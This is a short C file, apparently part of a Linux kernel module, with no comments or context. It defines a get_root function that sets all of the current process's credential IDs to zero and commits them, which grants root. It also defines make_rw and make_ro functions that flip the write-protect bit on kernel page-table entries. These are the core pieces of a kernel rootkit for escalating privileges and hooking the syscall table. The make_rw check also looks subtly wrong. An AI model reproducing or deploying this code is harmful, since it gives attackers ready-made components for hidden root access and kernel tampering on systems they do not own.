#include "linux/cred.h"

void get_root(void) {
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

int make_rw(void *address) {
    unsigned int level;
    pte_t       *pte = lookup_address((unsigned long)address, &level);
    if (pte->pte & ~_PAGE_RW)
        pte->pte |= _PAGE_RW;
    return 0;
}

int make_ro(void *address) {
    unsigned int level;
    pte_t       *pte = lookup_address((unsigned long)address, &level);
    pte->pte         = pte->pte & ~_PAGE_RW;
    return 0;
}
